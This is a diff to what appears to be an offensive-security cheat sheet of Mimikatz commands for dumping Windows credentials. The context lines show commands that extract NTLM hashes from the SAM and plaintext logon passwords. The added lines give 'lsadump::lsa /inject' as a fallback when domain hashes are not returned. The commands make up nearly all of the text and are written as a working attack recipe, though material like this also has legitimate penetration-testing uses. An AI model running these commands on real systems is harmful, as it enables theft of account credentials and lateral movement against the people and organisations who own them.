@@ -15,6 +15,10 @@ Extract all NTLM hashes from the SAM:
 ```cmd
 lsadump::sam
 ```
+If for whatever reason you are not getting hashes from the correct domain (ie. local rather than the Domain) then alternatively try:
+```
+lsadump::lsa /inject
+```
 Extract plaintext passwords from all available sources:
 ```cmd
 sekurlsa::logonpasswords
